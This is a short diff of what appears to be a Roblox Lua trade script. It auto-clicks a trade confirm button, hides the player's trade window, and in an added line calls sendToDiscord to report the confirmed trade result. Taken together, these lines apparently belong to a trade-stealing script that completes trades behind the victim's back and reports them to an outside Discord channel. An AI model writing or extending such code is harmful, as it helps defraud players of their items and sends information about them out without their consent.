@@ -1298,7 +1298,7 @@ local TradePassed = true
                             break
                         end
                         if Parthner_Nick == "SOMANYCHARACTERS" then
-
+                        			
                             game:GetService("Players")[player.Name].PlayerGui.TradeApp.Frame.Visible = false
                             break
                         end
@@ -1309,6 +1309,7 @@ local TradePassed = true
                             button_click(confirm_button)
                             wait(1)
                             game:GetService("Players")[player.Name].PlayerGui.TradeApp.Frame.Visible = false
+                            sendToDiscord(15753920, ResultToCofrimed, true)
                         break
                         else
                         
